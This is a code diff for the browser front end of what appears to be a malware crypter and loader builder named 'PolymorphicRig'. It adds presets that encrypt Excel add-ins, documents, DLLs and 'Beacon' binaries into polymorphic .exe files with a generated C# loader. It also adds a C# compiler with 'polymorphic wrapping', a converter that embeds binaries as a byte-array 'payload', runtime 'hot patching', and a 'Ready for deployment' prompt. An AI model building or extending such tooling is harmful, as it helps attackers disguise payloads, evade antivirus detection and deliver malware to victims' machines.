@@ -530,21 +530,98 @@ class Program
       }
     };
 
-    /* polymorphic encrypt */
-    $("btnPolyEncrypt").onclick = async () => {
+    /* polymorphic encrypt - enhanced */
+    const fileTypeConfigs = {
+      xll: { cipher: 'aes-256-cbc', poly: 'aes-ctr', ext: '.exe', desc: 'Excel Add-in' },
+      doc: { cipher: 'camellia-256-cbc', poly: 'chacha-ks', ext: '.exe', desc: 'Word Document' },
+      dll: { cipher: 'chacha20', poly: 'aes-ctr', ext: '.exe', desc: 'Dynamic Library' },
+      exe: { cipher: 'aes-256-cbc', poly: 'camellia-ctr', ext: '.exe', desc: 'Executable' },
+      bin: { cipher: 'chacha20', poly: 'chacha-ks', ext: '.exe', desc: 'Binary/Beacon' },
+      auto: { cipher: 'camellia-256-cbc', poly: 'aes-ctr', ext: '.exe', desc: 'Auto-detect' }
+    };
+
+    // Auto-configure based on file type selection
+    $("polyFileType").onchange = () => {
+      const type = $("polyFileType").value;
+      if (type !== 'custom' && fileTypeConfigs[type]) {
+        const config = fileTypeConfigs[type];
+        $("polyCipher").value = config.cipher;
+        $("polyMode").value = config.poly;
+        $("polyExt").value = config.ext;
+        $("polyOut").textContent = `Configured for ${config.desc} files`;
+      }
+    };
+
+    // Auto-detect file type when file is selected
+    $("polyFile").onchange = () => {
+      const f = $("polyFile").files[0];
+      if (!f) return;
+      
+      const ext = f.name.toLowerCase().split('.').pop();
+      if (fileTypeConfigs[ext]) {
+        $("polyFileType").value = ext;
+        $("polyFileType").dispatchEvent(new Event('change'));
+      }
+    };
+
+    // Preview configuration
+    $("btnPolyPreview").onclick = () => {
+      const f = $("polyFile").files[0];
+      const fileType = $("polyFileType").value;
+      const genMode = $("polyGenMode").value;
+      const cipher = $("polyCipher").value;
+      const poly = $("polyMode").value;
+      const ext = $("polyExt").value.trim();
+      const hotPatch = $("polyHotPatch").checked;
+
+      const preview = `Configuration Preview:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+File: ${f ? f.name : 'None selected'} (${f ? (f.size/1024).toFixed(1) + 'KB' : 'N/A'})
+Type: ${fileTypeConfigs[fileType]?.desc || fileType}
+Generation Mode: ${genMode}
+OpenSSL Cipher: ${cipher}
+Polymorphic Layer: ${poly}
+Output Extension: ${ext || 'none'}
+Hot Patching: ${hotPatch ? 'ENABLED' : 'DISABLED'}
+
+Output Files:
+${genMode === 'dual' || genMode === 'loader' ? '✓ C# Loader Executable' : ''}
+${genMode === 'dual' || genMode === 'binary' ? '✓ Encrypted Binary' : ''}
+
+Security Features:
+✓ Dual-layer encryption (OpenSSL + Polymorphic keystream)
+✓ Position-independent execution
+✓ Memory protection and cleanup
+${hotPatch ? '✓ Runtime hot patching with car() markers' : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+      $("polyOut").textContent = preview;
+    };
+
+    // Generate polymorphic files
+    $("btnPolyGenerate").onclick = async () => {
       const f = $("polyFile").files[0];
       const cipher = $("polyCipher").value;
       const poly = $("polyMode").value;
       const ext = $("polyExt").value.trim();
-      const pass = $("polyPass").value.trim();
+      const genMode = $("polyGenMode").value;
+      const hotPatch = $("polyHotPatch").checked;
+      let pass = $("polyPass").value.trim();
 
       if (!f) { $("polyOut").textContent = "Choose a file."; return; }
-      if (!pass) { $("polyOut").textContent = "Enter 64-hex key."; return; }
+
+      // Auto-generate passphrase if empty
+      if (!pass) {
+        const randomBytes = new Uint8Array(32);
+        crypto.getRandomValues(randomBytes);
+        pass = Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+        $("polyPass").value = pass;
+      }
 
       const { base } = basenameExt(f.name);
-      const url = `${apiBase}/polymorphic/generate?pass=${encodeURIComponent(pass)}&cipher=${encodeURIComponent(cipher)}&poly=${encodeURIComponent(poly)}&ext=${encodeURIComponent(ext)}&download=1`;
+      const url = `${apiBase}/polymorphic/generate?pass=${encodeURIComponent(pass)}&cipher=${encodeURIComponent(cipher)}&poly=${encodeURIComponent(poly)}&ext=${encodeURIComponent(ext)}&mode=${encodeURIComponent(genMode)}&hotpatch=${hotPatch}&download=1`;
       
-      $("polyOut").textContent = "Generating polymorphic executable...";
+      $("polyOut").textContent = `Generating ${genMode} polymorphic files...\nThis may take a few moments...`;
       
       try {
         const r = await fetch(url, { method: 'POST', body: f });
@@ -552,14 +629,300 @@ class Program
 
         const blob = await r.blob();
         const a = document.createElement('a');
-        const name = `${base}${ext || '.exe'}`;
+        const name = `${base}_polymorphic${ext || '.exe'}`;
         a.href = URL.createObjectURL(blob);
         a.download = name;
         document.body.appendChild(a); a.click(); a.remove();
-        $("polyOut").textContent = `Polymorphic executable generated → ${name}`;
+        
+        $("polyOut").textContent = `✅ Polymorphic files generated successfully!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Downloaded: ${name}
+Original Size: ${(f.size/1024).toFixed(1)}KB
+Encryption: ${cipher} + ${poly}
+Hot Patching: ${hotPatch ? 'ENABLED' : 'DISABLED'}
+Passphrase: ${pass.substring(0,16)}...
+
+Ready for deployment! 🚀`;
       } catch (e) {
-        $("polyOut").textContent = `Error: ${e.message}`;
+        $("polyOut").textContent = `❌ Error: ${e.message}`;
       }
+    };
+
+    /* C# compiler */
+    $("btnCsCompile").onclick = async () => {
+      const code = $("csCode").value.trim();
+      const target = $("csTarget").value;
+      const optimize = $("csOptimize").value;
+      const outputName = $("csOutputName").value.trim() || 'compiled_program';
+      const polyWrap = $("csPolyWrap").checked;
+
+      if (!code) { $("csOut").textContent = "Enter C# code."; return; }
+
+      $("csOut").textContent = "Compiling C# code...";
+
+      try {
+        const requestData = {
+          csCode: code,
+          outputExtension: target === 'dll' ? '.dll' : '.exe',
+          applyPolymorphicEncryption: polyWrap,
+          optimizationLevel: optimize
+        };
+
+        const r = await fetch(`${apiBase}/compile`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(requestData)
+        });
+
+        if (!r.ok) { $("csOut").textContent = await asJson(r); return; }
+
+        const blob = await r.blob();
+        const a = document.createElement('a');
+        const ext = requestData.outputExtension;
+        a.href = URL.createObjectURL(blob);
+        a.download = `${outputName}${ext}`;
+        document.body.appendChild(a); a.click(); a.remove();
+
+        $("csOut").textContent = `✅ Compilation successful!
+Downloaded: ${outputName}${ext}
+Target: ${target}
+Optimization: ${optimize}
+Polymorphic Wrapping: ${polyWrap ? 'ENABLED' : 'DISABLED'}`;
+      } catch (e) {
+        $("csOut").textContent = `❌ Compilation failed: ${e.message}`;
+      }
+    };
+
+    $("btnCsValidate").onclick = () => {
+      const code = $("csCode").value.trim();
+      if (!code) { $("csOut").textContent = "Enter C# code to validate."; return; }
+
+      // Basic syntax validation
+      const hasClass = /class\s+\w+/.test(code);
+      const hasMain = /static\s+void\s+Main/.test(code);
+      const hasUsing = /using\s+System/.test(code);
+      const hasBraces = (code.match(/\{/g) || []).length === (code.match(/\}/g) || []).length;
+
+      let issues = [];
+      if (!hasUsing) issues.push("Missing 'using System;'");
+      if (!hasClass) issues.push("No class definition found");
+      if (!hasMain && $("csTarget").value === 'exe') issues.push("No Main method found for executable");
+      if (!hasBraces) issues.push("Mismatched braces { }");
+
+      if (issues.length === 0) {
+        $("csOut").textContent = "✅ Syntax validation passed!\nCode appears to be valid C#.";
+      } else {
+        $("csOut").textContent = `⚠️ Validation issues found:\n${issues.map(i => `• ${i}`).join('\n')}`;
+      }
+    };
+
+    /* Binary to C# converter */
+    $("btnBinConvert").onclick = async () => {
+      const f = $("binFile").files[0];
+      const varName = $("binVarName").value.trim() || 'embeddedPayload';
+      const namespace = $("binNamespace").value.trim() || 'PolymorphicRig.Embedded';
+      const className = $("binClassName").value.trim() || 'PayloadData';
+      const integrity = $("binIntegrity").checked;
+
+      if (!f) { $("binOut").textContent = "Choose a binary file."; return; }
+
+      $("binOut").textContent = "Converting binary to C# source...";
+
+      try {
+        const arrayBuffer = await f.arrayBuffer();
+        const bytes = new Uint8Array(arrayBuffer);
+        const byteArray = Array.from(bytes).map(b => `0x${b.toString(16).padStart(2, '0')}`);
+        
+        // Generate hash if integrity check is enabled
+        let hashCode = '';
+        if (integrity) {
+          const hashBuffer = await crypto.subtle.digest('SHA-256', arrayBuffer);
+          const hashArray = Array.from(new Uint8Array(hashBuffer));
+          const hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+          hashCode = `
+        /// <summary>
+        /// Gets the SHA256 hash of the original file
+        /// </summary>
+        public static string OriginalHash => "${hash}";
+
+        /// <summary>
+        /// Verifies the integrity of the embedded data
+        /// </summary>
+        public static bool VerifyIntegrity()
+        {
+            using (var sha256 = System.Security.Cryptography.SHA256.Create())
+            {
+                var computedHash = BitConverter.ToString(sha256.ComputeHash(${varName})).Replace("-", "");
+                return string.Equals(computedHash, OriginalHash, StringComparison.OrdinalIgnoreCase);
+            }
+        }`;
+        }
+
+        const csSource = `using System;
+${integrity ? 'using System.Security.Cryptography;' : ''}
+
+namespace ${namespace}
+{
+    /// <summary>
+    /// Embedded binary data generated from: ${f.name}
+    /// Original size: ${bytes.length} bytes
+    /// Generated: ${new Date().toLocaleString()}
+    /// </summary>
+    public static class ${className}
+    {
+        /// <summary>
+        /// The embedded binary payload
+        /// </summary>
+        public static readonly byte[] ${varName} = new byte[]
+        {
+            ${byteArray.join(', ')}
+        };
+
+        /// <summary>
+        /// Gets the size of the embedded payload
+        /// </summary>
+        public static int Size => ${varName}.Length;
+
+        /// <summary>
+        /// Gets the generation timestamp
+        /// </summary>
+        public static string GeneratedAt => "${new Date().toLocaleString()}";
+${hashCode}
+
+        /// <summary>
+        /// Creates a copy of the embedded data
+        /// </summary>
+        public static byte[] GetCopy()
+        {
+            var copy = new byte[${varName}.Length];
+            Array.Copy(${varName}, copy, ${varName}.Length);
+            return copy;
+        }
+    }
+}`;
+
+        // Download the C# source file
+        const blob = new Blob([csSource], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = `${className}.cs`;
+        document.body.appendChild(a); a.click(); a.remove();
+
+        $("binOut").textContent = `✅ C# source generated successfully!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Downloaded: ${className}.cs
+Original File: ${f.name}
+Binary Size: ${bytes.length} bytes
+Array Elements: ${bytes.length}
+Namespace: ${namespace}
+Class: ${className}
+Variable: ${varName}
+Integrity Check: ${integrity ? 'ENABLED' : 'DISABLED'}
+
+Ready to include in your C# project! 🎯`;
+      } catch (e) {
+        $("binOut").textContent = `❌ Conversion failed: ${e.message}`;
+      }
+    };
+
+    $("btnBinPreview").onclick = async () => {
+      const f = $("binFile").files[0];
+      if (!f) { $("binOut").textContent = "Choose a binary file to preview."; return; }
+
+      const varName = $("binVarName").value.trim() || 'embeddedPayload';
+      const namespace = $("binNamespace").value.trim() || 'PolymorphicRig.Embedded';
+      const className = $("binClassName").value.trim() || 'PayloadData';
+
+      $("binOut").textContent = `Preview for ${f.name}:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+File Size: ${f.size} bytes
+Output Class: ${namespace}.${className}
+Variable Name: ${varName}
+Estimated C# File Size: ~${Math.ceil(f.size * 6 / 1024)}KB
+
+Generated Structure:
+namespace ${namespace}
+{
+    public static class ${className}
+    {
+        public static readonly byte[] ${varName} = { ... };
+        public static int Size => ${f.size};
+        public static string GeneratedAt => "...";
+        public static bool VerifyIntegrity() { ... }
+        public static byte[] GetCopy() { ... }
+    }
+}
+
+Click 'Generate C# Source' to create the file.`;
+    };
+
+    /* Plugin system status */
+    const testPlugin = async (plugin, btnId, statusId) => {
+      const btn = $(btnId);
+      const status = document.querySelector(`${statusId} .status-indicator`);
+      const text = document.querySelector(`${statusId} span:not(.status-indicator)`);
+      
+      btn.disabled = true;
+      btn.textContent = 'Testing...';
+      status.className = 'status-indicator status-warn';
+      text.textContent = 'Testing...';
+
+      try {
+        const r = await fetch(`${apiBase}/plugin/test/${plugin}`);
+        if (r.ok) {
+          status.className = 'status-indicator status-ok';
+          text.textContent = 'Active';
+          $("pluginOut").textContent += `\n✅ ${plugin} test passed`;
+        } else {
+          status.className = 'status-indicator status-err';
+          text.textContent = 'Failed';
+          $("pluginOut").textContent += `\n❌ ${plugin} test failed`;
+        }
+      } catch (e) {
+        status.className = 'status-indicator status-err';
+        text.textContent = 'Error';
+        $("pluginOut").textContent += `\n❌ ${plugin} error: ${e.message}`;
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Test';
+      }
+    };
+
+    $("btnLoaderTest").onclick = () => testPlugin('loader', 'btnLoaderTest', '#btnLoaderTest').parentElement.parentElement;
+    $("btnPatcherTest").onclick = () => testPlugin('patcher', 'btnPatcherTest', '#btnPatcherTest').parentElement.parentElement;
+    $("btnCompilerTest").onclick = () => testPlugin('compiler', 'btnCompilerTest', '#btnCompilerTest').parentElement.parentElement;
+    $("btnOpenSSLTest").onclick = () => testPlugin('openssl', 'btnOpenSSLTest', '#btnOpenSSLTest').parentElement.parentElement;
+
+    $("btnSystemDiag").onclick = async () => {
+      $("pluginOut").textContent = "Running full system diagnostics...\n";
+      
+      const tests = [
+        { name: 'Health Check', url: '/health' },
+        { name: 'Capabilities', url: '/capabilities' },
+        { name: 'OpenSSL', url: '/capabilities/dynamic' }
+      ];
+
+      for (const test of tests) {
+        try {
+          const r = await fetch(`${apiBase}${test.url}`);
+          if (r.ok) {
+            $("pluginOut").textContent += `✅ ${test.name}: OK\n`;
+          } else {
+            $("pluginOut").textContent += `❌ ${test.name}: FAILED\n`;
+          }
+        } catch (e) {
+          $("pluginOut").textContent += `❌ ${test.name}: ERROR - ${e.message}\n`;
+        }
+      }
+
+      $("pluginOut").textContent += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+System Diagnostics Complete
+Timestamp: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+    };
+
+    $("btnPluginReload").onclick = () => {
+      $("pluginOut").textContent = "🔄 Plugin system reloaded\nAll components refreshed";
     };
 
     /* initial status */
